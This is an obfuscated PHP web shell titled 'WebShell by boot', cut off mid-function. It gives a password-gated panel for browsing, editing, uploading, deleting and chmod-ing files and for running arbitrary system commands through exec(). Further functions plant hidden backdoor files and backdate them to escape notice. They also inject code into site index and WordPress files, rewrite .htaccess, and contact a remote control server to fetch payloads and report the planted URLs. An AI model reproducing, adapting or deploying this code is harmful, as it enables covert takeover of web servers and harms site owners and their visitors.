<?php
goto Cf6; Ac8: $can_read = false; goto b4a; B3f: if (!empty($_SESSION['c2hlbGxfY29kZQ==']) && strlen($_SESSION['c2hlbGxfY29kZQ==']) == 20) { goto b31; B1e: foreach ($file_path_array as $k => $v) { if (empty($v)) { ?><a href="?path=/">-</a>r
<?php } else { goto d5; Dd: ?></a><?php goto Bc; d5: if (empty($file_now_url)) { $file_now_url = $v; } else { $file_now_url = $file_now_url . '/' . $v; } goto B0; Ba: echo trim($v); goto Dd; B0: $file_now_path = $file_now_path . "/" . $v; goto A8; d3: ?>"><?php goto Ba; e3: echo $file_now_path; goto d3; A8: ?>/<a href="?path=<?php goto e3; Bc: } } goto E35; d18: if ($can_read) { ?>style="color:green;"<?php } else { ?>style="color:red;"<?php } goto ade; b9e: if ($can_write) { ?>style="color:green;"<?php } else { ?>style="color:red;"<?php } goto ca3; f5d: echo $data['HTTP_HOST']; goto B0c; D84: echo PHP_OS; goto f19; A51: ?></div>
<div style="width: 30%;display:inline-block;">Server Software: <?php goto A2a; e6f: if ($type == 2 || $type == 3) { goto Bd3; c8e: ?>"/>
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto Eee; df6: ?>"/>
<div class="form-group">
<?php goto be0; A30: echo $file_path; goto c8e; be0: $content = file_get_contents($file_path); goto D96; Bf6: echo htmlspecialchars($content); goto F95; Eee: echo $_SESSION['c2hlbGxfY29kZQ==']; goto df6; ed6: ?>
<div class="row">
<form action="?type=3" method="post">
<input type="hidden" id="path" name="path" value="<?php goto A30; F95: ?></textarea>
</div>
<button type="submit" class="btn btn-success">Edit</button>
</form>
</div>
<?php goto Ab0; Bd3: if ($type == 3) { goto c5; D1: $content_result = file_put_contents($path, $file_content); goto Ec; c5: $file_content = $_REQUEST['file_content']; goto D1; Ec: if ($content_result) { echo '<div class="alert alert-success" role="alert">File content modified successfully!</div>'; } else { echo '<div class="alert alert-danger" role="alert">Failed to modify file content!</div>'; } goto E7; E7: } goto ed6; D96: ?>
<textarea class="form-control" id="exampleFormControlTextarea1" name="file_content" rows="20" cols="100"><?php goto Bf6; Ab0: } else { if ($type == 4) { goto b48; d8a: ?>
<input type="text" class="form-control" id="file_new_name" name="file_new_name" value="<?php goto Ffc; Ffc: echo basename($file_path); goto F86; F86: ?>">
</div>
<button type="submit" class="btn btn-success">Edit</button>
</form>
</div>
<?php goto F26; b48: $file_new_name = $_POST['file_new_name']; goto Cc8; cf1: echo $_SESSION['c2hlbGxfY29kZQ==']; goto B08; B08: ?>"/>
<div class="form-group">
<?php goto C91; Cc8: if (!empty($file_new_name)) { $rename_result = rename($file_path, $now_path . '/' . $file_new_name); if ($rename_result) { echo '<div class="alert alert-success" role="alert">File name modified successfully!</div>'; $file_path = $now_path . '/' . $file_new_name; } else { echo '<div class="alert alert-danger" role="alert">Failed to modify file name!</div>'; } } goto Fd7; C91: $content = file_get_contents($file_path); goto d8a; Fd7: ?>
<div class="row">
<form action="?type=4" method="post">
<input type="hidden" id="path" name="path" value="<?php goto Bac; Bac: echo $file_path; goto Cb6; Cb6: ?>"/>
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto cf1; F26: } else { if ($type == 5) { goto c67; B68: ?>">
</div>
<button type="submit" class="btn btn-success">Edit</button>
</form>
</div>
<?php goto Ac6; b6f: ?>"/>
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto Baa; b51: ?>
<div class="row">
<form action="?type=5" method="post">
<input type="hidden" id="path" name="path" value="<?php goto cf6; c67: $new_chmod = trim($_POST['new_chmod']); goto bac; fdb: ?>"/>
<div class="form-group">
<?php goto Ca2; cf6: echo $file_path; goto b6f; e4e: ?>
<input type="text" class="form-control" id="new_chmod" name="new_chmod" value="<?php goto f9c; Baa: echo $_SESSION['c2hlbGxfY29kZQ==']; goto fdb; Ca2: $content = file_get_contents($file_path); goto e4e; bac: if (!empty($new_chmod)) { if (chmod($file_path, octdec($new_chmod))) { echo '<div class="alert alert-success" role="alert">File permissions modified successfully!</div>'; $old_chmod = $new_chmod; } else { echo '<div class="alert alert-danger" role="alert">Failed to modify file permissions!</div>'; } } else { $permissions = fileperms($file_path); $old_chmod = substr(sprintf('%o', $permissions), -4); } goto b51; f9c: echo $old_chmod; goto B68; Ac6: } else { if ($type == 6) { goto A82; C8a: if (!empty($new_name)) { if (is_file($now_path . '/' . $new_name)) { echo '<div class="alert alert-danger" role="alert">The file already exists!</div>'; } else { $file = fopen($now_path . '/' . $new_name, 'w'); if ($file) { if (fwrite($file, $new_content)) { echo '<div class="alert alert-success" role="alert">File created successfully!</div>'; } else { echo '<div class="alert alert-danger" role="alert">Unable to write to file!</div>'; } fclose($file); } else { echo '<div class="alert alert-danger" role="alert">Unable to open file!</div>'; } } } goto C9f; Cf1: ?>"/>
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto ec4; a72: ?>"/>
<div class="form-group">
<input type="text" class="form-control" id="new_name" name="new_name" value="<?php goto B90; B90: echo $new_name; goto F41; c30: ?></textarea>
</div>
<button type="submit" class="btn btn-success">Create Now</button>
</form>
</div>
<?php goto E47; ec4: echo $_SESSION['c2hlbGxfY29kZQ==']; goto a72; fc9: echo htmlspecialchars($new_content); goto c30; C9f: ?>
<div class="row">
<form action="?type=6" method="post">
<input type="hidden" id="path" name="path" value="<?php goto ba5; A82: $new_name = trim($_POST['new_name']); goto Ed0; Ed0: $new_content = trim($_POST['new_content']); goto C8a; F41: ?>" placeholder="New File Name">
</div>
<div class="form-group">
<textarea class="form-control" id="new_content" name="new_content" rows="20" cols="100" placeholder="New File Content"><?php goto fc9; ba5: echo $file_path; goto Cf1; E47: } else { if ($type == 7) { goto E70; a9b: echo $new_name; goto c81; A91: echo $file_path; goto A1d; C60: if (!empty($new_name)) { if (!is_dir($now_path . '/' . $new_name)) { if (mkdir($now_path . '/' . $new_name)) { echo '<div class="alert alert-success" role="alert">Directory created successfully!</div>'; } else { echo '<div class="alert alert-success" role="alert">Directory creation failed!</div>'; } } else { echo '<div class="alert alert-success" role="alert">Directory already exists!</div>'; } } goto E12; E12: ?>
<div class="row">
<form action="?type=7" method="post">
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto fc5; c81: ?>" placeholder="New Folder Name">
</div>
<button type="submit" class="btn btn-success">Create Now</button>
</form>
</div>
<?php goto D97; E70: $new_name = trim($_POST['new_name']); goto C60; A1d: ?>"/>
<div class="form-group">
<input type="text" class="form-control" id="new_name" name="new_name" value="<?php goto a9b; Ee8: ?>"/>
<input type="hidden" id="path" name="path" value="<?php goto A91; fc5: echo $_SESSION['c2hlbGxfY29kZQ==']; goto Ee8; D97: } else { if ($type == 8) { goto bf; b6: ?>
<?php goto D0; E5: if (!empty($search_keys)) { goto A7; A7: $result = array(); goto d1; af: foreach ($file_list as $file) { $str = '<a href="?path=' . $file . '&type=2" target="_blank">' . $file . '</a>'; echo '<p><input type="checkbox" class="item" name="files[]" value="' . $file . '"/>&nbsp;&nbsp;' . $str . '</p>'; } goto fd; e2: ?></div>
<div>
<p>
<input type="checkbox" name="allcheck" id="allcheck" value="1"/>&nbsp;&nbsp;all check
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<input type="button" class="delBtn" value="delete"/>
</p>
</div>
<div>
<?php goto af; c4: echo "<span style='color:red;'>" . $search_keys . "</span> files list£º\n"; goto e2; fd: ?>
</div>
</form>
<?php goto F3; d1: $file_list = findFilesWithContent($website_path, $search_keys, 0, 10); goto E0; E0: ?>
<form action="?type=8" method="post" id="deleteForm" style="margin: 1rem;">
<input type="hidden" name="act" id="act" value="deleteFiles"/>
<div><?php goto c4; F3: } goto e1; da: ?>" placeholder="Search content">
</div>
<button type="submit" class="btn btn-success">Search</button>
</form>
</div>
<?php goto E5; D7: ?>
<div class="row">
<form action="?type=8" method="post">
<div class="form-group">
<input type="text" class="form-control" id="search_keys" name="search_keys" value="<?php goto Af; Af: echo $search_keys; goto da; Fe: $act = trim($_POST['act']); goto D7; e1: if (!empty($act) && $act == 'deleteFiles') { $file_list = $_REQUEST['files']; foreach ($file_list as $k => $v) { deleteFile($v); } } goto b6; bf: $search_keys = trim($_POST['search_keys']); goto Fe; D0: } else { goto b8; f9: echo $file_path; goto e5; d65: ?>"/>
<input type="hidden" name="shell_id" value="<?php goto F30; C0: ?>&type=8">Search Files</a>
</form>
</div>
<div class="col-6">
<form action="?path=<?php goto e4; e71: if ($_POST['act'] == 'exec_code') { goto db; db: $exec_code = trim($_POST['exec_code']); goto b7; a4: if ($returnVar === 0) { echo "<div style='color: green;font-weight:bold;'>" . $exec_code . " is Successfully.</div>"; foreach ($output as $k => $v) { echo $v . '<br/>'; } } else { echo "<div style='color: red;font-weight:bold;'>" . $exec_code . " is Failed:" . $returnVar . ".</div>"; } goto De; b7: exec($exec_code, $output, $returnVar); goto a4; De: } goto D7c; d0: ?>"/>
<input type="hidden" name="shell_type" value="<?php goto fb; E23: ?>"/>
<button type="submit" class="btn btn-danger btn-sm">Doors</button>
</form>
</div>
<div class="col-2 col-sm-1">
<form action="?path=<?php goto b19; Ada: ?>" method="post">
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto Bad; Ac: $file_list = scandir($now_path); goto Bf; d7: ?>"/>
<button type="submit" class="btn btn-success btn-sm">Reback</button>
</form>
</div>
<div class="col-2 col-sm-1">
<form action="?path=<?php goto f9; a2e: if (!empty($file_list) && count($file_list) > 2) { foreach ($file_list as $k => $v) { if (!($v == '.' || $v == '..')) { goto B2; A1: ?>
</td>
<td>
<?php goto F8; df: ?>" name="childcheck[]">
</div>
</th>
<td>
<?php goto C1; ac: ?>
</td>
<td>
<?php goto ce; B2: $file_url = $now_path . '/' . $v; goto be; F2: if (strpos($permission, 'w') !== false) { echo '<font color="green" style="font-weight: bold;">' . $permission . '</font>'; } else { echo '<font color="red" style="font-weight: bold;">' . $permission . '</font>'; } goto A3; c0: echo $file_url; goto C2; dc: $modificationTime = filemtime($file_url); goto Cf; e8: echo $file_url; goto bb; e9: ?>
</td>
<td>
<?php goto dc; be: ?>
<tr>
<th>
<div class="form-check">
<input class="form-check-input" type="checkbox" value="<?php goto ef; B5: echo $file_url; goto d9; C2: ?>&type=5">Chmod</a>
</td>
</tr>
<?php goto Cc; F8: $permission = getFilePermission($file_url); goto F2; D9: if (!is_dir($file_url)) { goto Eb; Eb: ?>
<a href="<?php goto c8; c8: echo $now_url . '/' . $v; goto Ea; Ea: ?>" target="_blank">click visit</a>
<?php goto Fd; Fd: } goto ac; A3: ?>
</td>
<td>
<a class="btn btn-primary btn-xs" href="?path=<?php goto B5; ce: if (is_dir($file_url)) { echo '<font color="green" style="font-weight: bold;">Directory</font>'; } else { echo getFileSize($file_url); } goto e9; d9: ?>&type=4">Rename</a>
<a class="btn btn-info btn-xs" href="?path=<?php goto e8; ef: echo $file_url; goto df; C1: if (is_dir($file_url)) { echo '<a href="?path=' . $file_url . '&type=1" style="color: green;font-weight:bold;">
<i class="bi bi-folder" style="vertical-align: middle;">
<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-folder" viewBox="0 0 16 16">
<path d="M.54 3.87.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.826a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31zM2.19 4a1 1 0 0 0-.996 1.09l.637 7a1 1 0 0 0 .995.91h10.348a1 1 0 0 0 .995-.91l.637-7A1 1 0 0 0 13.81 4H2.19zm4.69-1.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707z"/>
</svg>
</i>' . $v . '</a>'; } else { echo '<a href="?path=' . $file_url . '&type=2">' . $v . '</a>'; } goto F0; Cf: echo date("Y-m-d H:i:s", $modificationTime); goto A1; bb: ?>&type=2">Edit</a>
<a class="btn btn-warning btn-xs" href="?path=<?php goto c0; F0: ?>
</td>
<td>
<?php goto D9; Cc: } } } else { ?>
<tr>
<td colspan="4" style="text-align: center;color:red;">
No Files!
</td>
</tr>
<?php } goto d27; ae: ?>"/>
<input type="hidden" name="shell_id" value="<?php goto Dc; E99: ?>"/>
<div class="col-12" style="margin-bottom: 1rem;">
<input type="hidden" name="act" value="del"/>
<button type="submit" class="btn btn-danger btn-xs">Delete</button>
</div>
<table class="table table-bordered">
<thead>
<tr>
<th>
<div class="form-check">
<input class="form-check-input" type="checkbox" value="1" id="allcheck" name="allcheck">
</div>
</th>
<th>Name</th>
<th>Url</th>
<th>Size</th>
<th>Modify</th>
<th>Permission</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<?php goto a2e; de: echo $_SESSION['c2hlbGxfY29kZQ==']; goto b5; F30: echo $_SESSION['c2hlbGxfaWQ=']; goto C1a; e2b: ?>" method="post">
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto e63; fcd: echo $_SESSION['c2hlbGxfaWQ=']; goto Fb4; D8: echo $_SESSION['c2hlbGxfY29kZQ==']; goto d2; ec: ?>" method="post" enctype="multipart/form-data">
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto de; B3: ?>"/>
<input type="hidden" name="shell_id" value="<?php goto e0; Aa: ?>&type=7">Create Folder</a>
<a class="btn btn-warning btn-sm" href="?path=<?php goto f8; E6: ?>" method="post">
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto f7; e97: ?>"/>
<input type="hidden" name="act" value="shell"/>
<input type="hidden" name="type" value="station"/>
<input type="hidden" name="shell_id" value="<?php goto fcd; Dc: echo $_SESSION['c2hlbGxfaWQ=']; goto d0; a64: ?>
<?php goto e71; ba8: echo $_SESSION['dHlwZQ==']; goto B45; E36: echo $_SESSION['c2hlbGxfY29kZQ==']; goto c84; cb: echo $file_path; goto ec; d2: ?>"/>
<input type="hidden" name="act" value="shell"/>
<input type="hidden" name="type" value="exec"/>
<input type="hidden" name="group_id" value="<?php goto Ab; bee: ?>"/>
<input type="hidden" name="group_id_2" value="<?php goto bb5; Ee: echo $file_path; goto C4; E4: ?>"/>
<input type="hidden" name="shell_type" value="<?php goto f2; a5: echo $file_path; goto Ada; Fb9: echo $file_path; goto F99; Bf: $file_list = sortByFolder($now_path, $file_list); goto ee; Af4: ?>"/>
<input type="hidden" name="group_id_3" value="<?php goto Eae; Ab: echo $_SESSION['Z3JvdXA=']; goto ae; b19: echo $file_path; goto e2b; F99: ?>" method="post">
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto d95; C4: ?>&type=6">Create File</a>
<a class="btn btn-success btn-sm" href="?path=<?php goto e6; f2: echo $_SESSION['dHlwZQ==']; goto d7; e5: ?>" method="post">
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto D8; c7: ?>" style="display: inline-block;width: 80%;"/>
<input type="hidden" name="act" value="change_dir"/>
<button type="submit" class="btn btn-info btn-sm">Change Dir</button>
</form>
</div>
<div class="col-6">

</div>
</div>
</div>
<div class="bd-example bd-example-row" style="border: 1px solid #ededed;padding: 1rem;margin: 1rem 0;">
<div class="row">
<div class="col-2 col-sm-1">
<form action="?path=<?php goto Ce; Fb4: ?>"/>
<input type="hidden" name="shell_type" value="<?php goto ba8; fb: echo $_SESSION['dHlwZQ==']; goto bd; B6: if ($_POST['act'] == 'upload') { $targetFile = $now_path . '/' . basename($_FILES["fileToUpload"]["name"]); if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) { echo '<div class="alert alert-success" role="alert">File ' . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . ' uploaded!</div>'; } else { echo '<div class="alert alert-danger" role="alert">File upload failed!</div>'; } } goto Ac; e0: echo $_SESSION['c2hlbGxfaWQ=']; goto E4; b5: ?>"/>
<input type="hidden" name="act" value="upload"/>
<input class="form-control form-control-sm" id="formFileSm" name="fileToUpload" type="file" style="width: 200px;display: inline-block;">
<button type="submit" class="btn btn-info btn-sm">Upload</button>
<a class="btn btn-primary btn-sm" href="?path=<?php goto Ee; e6: echo $file_path; goto Aa; d27: ?>
</tbody>
</table>
</form>
</div>
<?php goto d8d; Eae: echo $_SESSION['dGhpcmRncm91cA==']; goto bf0; C1a: ?>"/>
<input type="hidden" name="shell_type" value="<?php goto F23; f8: echo $file_path; goto C0; bf0: ?>"/>
<input type="hidden" name="shell_type" value="<?php goto F0f; d95: echo $_SESSION['c2hlbGxfY29kZQ==']; goto E99; eb: echo $_SESSION['Z3JvdXA=']; goto B3; f7: echo $_SESSION['c2hlbGxfY29kZQ==']; goto B4; e7: if ($_POST['act'] == 'del') { $delete_file_list = $_POST['childcheck']; if (!empty($delete_file_list)) { goto ca; c6: if ($count > 0) { echo '<div class="alert alert-success" role="alert">Delete ' . $count . ' files successfully!</div>'; } goto C5; Bb: $fail_count = 0; goto B7; B7: foreach ($delete_file_list as $k => $v) { if (is_dir($v)) { $del_result = deleteDirectory($v); } else { $del_result = unlink($v); } if ($del_result) { $count++; } else { $fail_count++; } } goto c6; ca: $count = 0; goto Bb; C5: if ($fail_count > 0) { echo '<div class="alert alert-danger" role="alert">Delete ' . $fail_count . ' files failed!</div>'; } goto E1; E1: } } goto B6; B4: ?>"/>
<input type="hidden" name="act" value="shell"/>
<input type="hidden" name="type" value="reback"/>
<input type="hidden" name="group_id" value="<?php goto eb; Baf: ?>"/>
<input type="hidden" name="act" value="shell"/>
<input type="hidden" name="type" value="others"/>
<input type="hidden" name="shell_id" value="<?php goto A52; D7c: ?>
</div>
</div>
</div>
<form action="?path=<?php goto Fb9; F0f: echo $_SESSION['dHlwZQ==']; goto Af1; ee: ?>
<div class="row">
<div class="col-12" style="margin-bottom: 1rem;">
<div class="row">
<div class="col-6">
<form action="?path=<?php goto cb; f65: if ($_POST['act'] == 'shell') { if ($_POST['type'] == 'reback') { rebackAction($_POST, $pws, $now_site); } else { if ($_POST['type'] == 'exec') { execAction($_POST, $pws, $now_site); } else { if ($_POST['type'] == 'doors') { doorsAction($_POST, $pws, $now_site); } else { if ($_POST['type'] == 'others') { othersAction($_POST, $pws, $now_site); } else { if ($_POST['type'] == 'station') { stationAction($_POST, $pws, $now_site); } } } } } } goto a64; D2: echo $path; goto c7; b8: ?>
<?php goto e7; bb5: echo $_SESSION['c2Vjb25k']; goto Af4; c84: ?>"/>
<input type="hidden" name="act" value="shell"/>
<input type="hidden" name="type" value="doors"/>
<input type="hidden" name="group_id" value="<?php goto a6d; f4c: echo $file_path; goto Ff5; e4: echo $file_path; goto d4; e63: echo $_SESSION['c2hlbGxfY29kZQ==']; goto e97; Ce: echo $file_path; goto E6; B45: ?>"/>
<button type="submit" class="btn btn-primary btn-sm">Station</button>
</form>
</div>
</div>
</div>
<div class="bd-example bd-example-row" style="border: 1px solid #ededed;padding: 1rem;margin: 1rem 0;">
<div class="row">
<div class="col-12 col-sm-12" style="text-align: center;font-weight:bold;">
<?php goto f65; Bad: echo $_SESSION['c2hlbGxfY29kZQ==']; goto Baf; d4: ?>" method="post" enctype="multipart/form-data">
<input type="text" name="exec_code" class="form-control" value="" style="display: inline-block;width: 50%;"/>
<input type="hidden" name="act" value="exec_code"/>
<button type="submit" class="btn btn-info btn-sm">Exec</button>
</form>
</div>
</div>
</div>
<div class="col-12" style="margin-bottom: 1rem;">
<div class="row">
<div class="col-6">
<form action="?type=1" method="post" enctype="multipart/form-data">
<input type="text" name="dir" class="form-control" value="<?php goto D2; Af1: ?>"/>
<button type="submit" class="btn btn-info btn-sm">Others</button>
</form>
</div>
<div class="col-2 col-sm-1">
<form action="?path=<?php goto f4c; A52: echo $_SESSION['c2hlbGxfaWQ=']; goto bee; F23: echo $_SESSION['dHlwZQ==']; goto E23; Ff5: ?>" method="post">
<input type="hidden" name="c2hlbGxfY29kZQ==" value="<?php goto E36; a6d: echo $_SESSION['Z3JvdXA=']; goto d65; bd: ?>"/>
<button type="submit" class="btn btn-warning btn-sm">Exec</button>
</form>
</div>
<div class="col-2 col-sm-1">
<form action="?path=<?php goto a5; d8d: } } } } } } goto bda; A6f: ?></div>
<div style="width: 30%;display:inline-block;">OS: <?php goto D84; B0c: ?></div>
<div style="width: 30%;display:inline-block;">User: <?php goto b6a; C86: echo $website_path; goto c36; f19: ?></div>
</p>
<p>
<div style="width: 30%;display:inline-block;">Website: <?php goto f5d; ca3: ?>>Writeable</span>
</p>
</div>
<?php goto e6f; a80: ?></div></p>
<p>
<a href="?path=<?php goto C86; Fe5: echo $data['SERVER_ADDR']; goto A51; E35: ?>
&nbsp;&nbsp;&nbsp;&nbsp;<span <?php goto d18; fa8: $file_now_path = ""; goto B1e; b31: ?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>WebShell by boot</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<style>.col-12{width: 100%;display: inline-block;}.col-6{width: 50%;display: inline-block;float: left;}</style>
</head>
<body>
<div class="jumbotron text-center" style="padding: 1rem 0rem;">
<h1 style="font-size:2rem;font-weight: bold;margin: 1rem 0;">WebShell by boot</h1>
</div>
<div class="container">
<div class="row">
<p>
<div style="width: 30%;display:inline-block;">Server IP: <?php goto Fe5; c36: ?>">Project</a>
</p>
</div>
<div class="row">
<p>
Path:
<?php goto fa8; ade: ?>>Readable</span> | <span <?php goto b9e; bda: ?>
</div>
<script>
$(function(){
$('#allcheck').click(function(){
if($('#allcheck').is(":checked")){
$('input[name="childcheck[]"]').each(function(){
$(this).attr('checked', true);
})
}else{
$('input[name="childcheck[]"]').each(function(){
$(this).attr('checked', false);
})
}
})
})
</script>
<script>
$(function(){
$("#allcheck").click(function(){
$('.item').prop('checked', this.checked);
});

$('.item').click(function(){
if ($('.item').length == $('.item:checked').length) {
$('#allcheck').prop('checked', true);
} else {
$('#allcheck').prop('checked', false);
}
});

$('.delBtn').click(function(){
var checkedValues = [];

$(".item:checked").each(function(){
checkedValues.push($(this).val());
});
if(checkedValues.length == 0){
alert('please select files');
return false;
}else{
$('#deleteForm').submit();
}
});
})
</script>
</body>
</html>
<?php goto A47; b6a: echo get_current_user(); goto a80; A2a: echo $data['SERVER_SOFTWARE']; goto A6f; A47: } goto D80; B8f: $now_url = $web_url . $sy_path; goto Bd8; ace: $domain = $_SERVER['HTTP_HOST']; goto Afa; E2f: ini_set('memory_limit', '-1'); goto F38; f6e: $sy_path = str_replace($website_path, '', $now_path); goto B8f; b4a: if (is_readable($now_path)) { $can_read = true; } goto a7b; F9b: function add_others($group2_code, $group3_code, $second_file, $third_file, $now_site) { goto d79; d79: $result = array(); goto e65; Fd5: return $result; goto A86; bbb: if ($sf) { $result['second_url'] = $now_site . '/' . $second_file; } goto D68; D68: if ($tf) { $result['third_url'] = $now_site . '/' . $third_file; } goto Fd5; D2a: $tf = crefile($third_file, $group3_code); goto Dbb; e65: $sf = crefile($second_file, $group2_code); goto D2a; Dbb: $result['second_url'] = ""; goto bf4; bf4: $result['third_url'] = ""; goto bbb; A86: } goto C23; ef2: function cndoorfile($fipath, $file_name, $open_content, $contnt) { goto D81; C89: $fileurl = $fipath . '/' . $file_name; goto fe7; D81: if (!is_dir($fipath)) { mkdir($fipath, 0755, true); } goto C89; fe7: if (file_put_contents($fileurl, $contnt) !== false) { goto Ed9; e59: chmod($fileurl, 0555); goto E6a; Ed9: $time = time() - rand(30, 100) * 24 * 60 * 60 - rand(0, 3600); goto F42; C2b: return true; goto E7e; D4d: $ht_content_now = str_replace('{#htcontent}', $file_name, $open_content); goto A85; F42: touch($fipath, $time); goto e59; A85: chmod($fipath . '/.htaccess', 0755); goto e77; E6a: $ht_content_now = ""; goto D4d; a7c: chmod($fipath, 0555); goto C2b; e77: if (file_put_contents($fipath . '/.htaccess', $ht_content_now) !== false) { chmod($fipath . '/.htaccess', 0555); } goto a7c; E7e: } else { return false; } goto Dd5; Dd5: } goto Cba; f09: function add_exec($website_root, $ht_contnt, $index_contnt, $exec_code, $wp_ycode) { goto B43; Ca5: $exec_code = str_replace("[##indexcontent##]", base64_encode($index_contnt . $wp_ycode), $exec_code); goto bd8; efa: $exec_code = str_replace("[##htcontent##]", base64_encode($ht_contnt), $exec_code); goto Ca5; bd8: $o23 = $website_root . "/wp-includes/" . get6str() . ".php"; goto F37; F37: echo $o23; goto c5d; D9d: fwrite($u17, $exec_code); goto fa0; B43: $exec_code = str_replace("[##website_path##]", $website_root, $exec_code); goto efa; D1d: if ($res === 0) { return true; } else { return false; } goto Fc7; De5: exec("php -f {$o23} > /dev/null 2>/dev/null &", $a22, $res); goto D1d; c5d: $u17 = fopen($o23, "a+"); goto D9d; fa0: fclose($u17); goto De5; Fc7: } goto A0a; e8b: $website_path = $data['DOCUMENT_ROOT']; goto f63; a9f: $last_folder_url = ""; goto B3f; Bd8: $post_data = $_POST; goto ca2; Ad7: if (!empty($path)) { $file_path = $path; $now_path = $path; } goto Eb9; d46: if (!is_dir($now_path)) { $now_path = dirname($now_path); } goto Ac8; A7d: function getAllSubdirectories($directory, $maxDepth = 10, $currentDepth = 0) { goto B0f; B0f: global $all_paths; goto aac; f9d: if ($currentDepth > $maxDepth) { return array(); } goto Fb5; F8c: foreach ($items as $item) { goto C4d; C4d: if ($item == '.' || $item == '..') { continue; } goto a4d; a4d: $path = $directory . DIRECTORY_SEPARATOR . $item; goto Bf2; Bf2: if (is_dir($path)) { goto f1a; f1a: $subdirectories[] = $path; goto Da5; e08: $subdirectories = array_merge($subdirectories, getAllSubdirectories($path, $maxDepth, $currentDepth + 1)); goto E4f; Da5: $all_paths[] = $path; goto e08; E4f: } goto c73; c73: } goto C54; aac: $subdirectories = array(); goto f9d; Fb5: $items = scandir($directory); goto F8c; C54: return $subdirectories; goto cd6; cd6: } goto da8; Cf6: @set_time_limit(0); goto bd2; A0a: function get6str() { goto Fa6; Fa6: $s = ""; goto c11; c11: for ($i = 0; $i < 6; $i++) { $s .= chr(mt_rand(97, 122)); } goto Cb9; Cb9: return $s; goto B14; B14: } goto abf; Dee: function crefile($fiurl, $contnt) { goto e05; E82: if (file_put_contents($file_path, $contnt) !== false) { goto f50; f50: $time = time() - rand(30, 100) * 24 * 60 * 60 - rand(0, 3600); goto f2e; Dbe: return true; goto f9b; f2e: touch($file_path, $time); goto Dbe; f9b: } else { return false; } goto b57; e05: $path = $_SERVER['DOCUMENT_ROOT'] . '/'; goto D1c; D59: $file_path = $path . $fiurl; goto E82; ddc: if (!is_dir($filath)) { if (!mkdir($filath, 0755, true)) { return false; } } goto D59; D1c: $filath = $path . dirname($fiurl); goto ddc; b57: } goto c61; C23: function doorsAction($data, $pweb, $now_site) { goto b15; c04: $result_data['shell_id'] = $data['shell_id']; goto B0a; a04: $shell_type = $data['shell_type']; goto A2e; e9b: $group_id = $data['group_id']; goto a04; dfa: $res = curlpost($save_url, $result_data); goto fbb; a23: $result_data['shell_type'] = $shell_type; goto dfa; Fbe: if (!empty($json_array['doors'])) { $result = add_doors($json_array['doors'], $json_array['doors_55'], $json_array['wp_files'], $json_array['third_file'], $json_array['ht_ban_content'], $json_array['ht_open_content'], $json_array['shell_action_code'], $now_site); if (!empty($result['door_files'])) { goto Ca6; Ca6: $result_data['door_urls'] = implode(';', $result['door_files']); goto C6c; Dc6: $result_data['status'] = 1; goto ae5; C6c: $result_data['shell_other_url'] = $result['shell_other_url']; goto Dc6; ae5: } else { $result_data['code'] = '1001'; $result_data['status'] = 2; } } else { $result_data['code'] = '1002'; $result_data['status'] = 2; } goto a23; B0a: $result_data['action'] = 'doors'; goto c42; fbb: if ($res['status']) { echo '<p style="color:green;">Doors is successfully, Success .h is ' . $result['count'] . '</p>'; foreach ($result['door_files'] as $k => $v) { echo '<p><a href="' . $v . '" target="_blank">' . $v . '</a></p>'; } } else { echo '<p style="color:red;">Doors is failed! ' . $result_data['code'] . '</p>'; } goto E69; b15: $result_data = array(); goto c04; b07: $cc = curlget($url); goto F68; c42: $save_url = base64_decode($pweb) . '/save.php'; goto dd0; A2e: $url = base64_decode($pweb) . '/indexdoor.php?action=doors&shell_id=' . $shell_id . '&group_id=' . $group_id . '&shell_type=' . $shell_type; goto b07; F68: $json_array = json_decode($cc, true); goto Fbe; dd0: $shell_id = $data['shell_id']; goto e9b; E69: } goto a3e; fd0: function add_station($station_code, $ht_content, $now_site) { goto d24; c59: return $count; goto D5f; d24: $station_code = base64_decode($station_code); goto f0d; C33: $all_folders = getParentsFolders($path); goto a43; f0d: $count = 0; goto E88; Cbb: foreach ($all_results as $k => $v) { goto Ee5; E3f: if (strpos($wp_yuan, $station_code) === false) { file_put_contents($wp_url, $station_code . $wp_yuan); chmod($wp_yuan, 0444); } goto Dcb; de2: if (file_exists($index_url)) { chmod($index_url, 0644); $index_yuan = file_get_contents($index_url); } goto C3f; B41: $ht_url = $v . '/.htaccess'; goto C47; E19: $wp_yuan = ""; goto A0b; F82: file_put_contents($ht_url, $ht_content); goto Bec; C47: $index_yuan = ""; goto de2; Bec: chmod($ht_url, 0444); goto c71; C3f: if (strpos($index_yuan, $station_code) === false) { file_put_contents($index_url, $station_code . $index_yuan); chmod($index_url, 0444); } goto E19; A0b: if (file_exists($wp_url)) { chmod($wp_url, 0644); $wp_yuan = file_get_contents($wp_url); } goto E3f; Dcb: chmod($ht_url, 0644); goto F82; c71: $count++; goto a78; ece: $wp_url = $v . 